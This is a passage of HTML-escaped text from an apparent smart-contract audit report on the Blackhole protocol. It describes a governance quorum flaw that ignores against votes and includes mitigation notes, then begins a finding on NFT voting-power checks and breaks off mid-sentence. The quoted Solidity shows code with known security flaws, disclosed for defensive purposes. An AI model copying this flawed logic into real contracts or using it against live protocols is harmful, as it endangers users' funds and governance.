class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSucceeded\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_quorumReached\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_voteDefeated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDefeated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eExpired\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eFrom the code we can see that if quorum is not reached it, the proposal is considered Expired after the voting period has ended. However, due to the fact that \u003ccode\u003e_quorumReachedFunction\u003c/code\u003e is using ONLY the \u003ccode\u003eforVotes\u003c/code\u003e and \u003ccode\u003eabstainVotes\u003c/code\u003e, which is incorrect based on the functionality that protocol wants to introduce, we can imagine the following scenario:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe emissions are high, and almost all of the users agree that they should decrease the emissions rate.\u003c/li\u003e\n\u003cli\u003e99% of votes are \u003ccode\u003eagainstVotes\u003c/code\u003e as almost everybody agrees that emissions should decrease.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eThe voting period for the proposal ends\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUser tries to execute the proposal expecting that the emissions rate will decrease as 99% of the votes were against and this amount of votes should meet the quorum.\u003c/li\u003e\n\u003cli\u003eThe function executes but it calculates the state as Expired because according to it quorum has not been reached as against votes DO NOT count into the quorum.\u003c/li\u003e\n\u003cli\u003eThe emissions rate stay the same even though “all” of the voting users agreed that it should decrease.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eQuorum reached snippet:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"73\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_quorumReached\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eProposalVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalvote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_proposalVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003equorum\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eproposalSnapshot\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) \u0026lt;=\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e//@audit NO AGAINST VOTES\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eproposalvote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalvote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabstainVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe can see that evaluation whether quorum was reached or not is incorrect based on the functionality that protocol wants to achieve leading to, for example, decrease of the emissions rate by the \u003ccode\u003eBlackGovernor\u003c/code\u003e being not possible, when almost everybody agrees to do so. Based on the provided facts, I think this should be Medium severity finding as it disrupts the emissions of the BlackToken.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-20\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-20\" aria-label=\"recommended mitigation steps 20 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eWhen evaluating whether quorum was reached, take against votes into the account.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-41\"\u003erayss\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-8\"\u003elonelybones\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eThe sponsor team requested that the following note be included: \u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThis issue originates from the upstream codebase, inherited from ThenaV2 fork. Given that ThenaV2 has successfully operated at scale for several months without incident, we assess the severity of this issue as low. The implementation has been effectively battle-tested in a production environment, which significantly reduces the practical risk associated with this finding.\nReference: \u003ca href=\"https://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/governance/Governor.sol#L668\"\u003ehttps://github.com/ThenafiBNB/THENA-Contracts/blob/main/contracts/governance/Governor.sol#L668\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-20-getsmnftpastvotes-incorrectly-checks-for-voting-power-leading-to-some-nfts-incorrectly-being-eligible-to-vote\" style=\"position:relative;\"\u003e\u003ca href=\"#m-20-getsmnftpastvotes-incorrectly-checks-for-voting-power-leading-to-some-nfts-incorrectly-being-eligible-to-vote\" aria-label=\"m 20 getsmnftpastvotes incorrectly checks for voting power leading to some nfts incorrectly being eligible to vote permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-274\"\u003e[M-20] \u003ccode\u003egetsmNFTPastVotes\u003c/code\u003e incorrectly checks for Voting Power leading to some NFTs incorrectly being eligible to vote\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-423\"\u003ehakunamatata\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L1263-L1279\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/VotingEscrow.sol#L1263-L1279\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/libraries/VotingBalanceLogic.sol#L20-L43\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/libraries/VotingBalanceLogic.sol#L20-L43\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eThe \u003ccode\u003egetsmNFTPastVotes\u003c/code\u003e function checks what was the voting power of the some account at specific point in time.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"74\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetsmNFTPastVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_checkIndex\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVotingDelegationLib\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPastVotesIndex\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ecpData\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Sum votes\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecpData\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003echeckpoints\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_checkIndex\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_tokenIds\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (!\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elocked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisSMNFT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk15\"\u003econtinue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// Use the provided input timestamp here to get the right decay\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003evotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e =\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003evotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e +\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eVotingBalanceLogic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOfNFT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003evotingBalanceLogicData\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWe can see in the 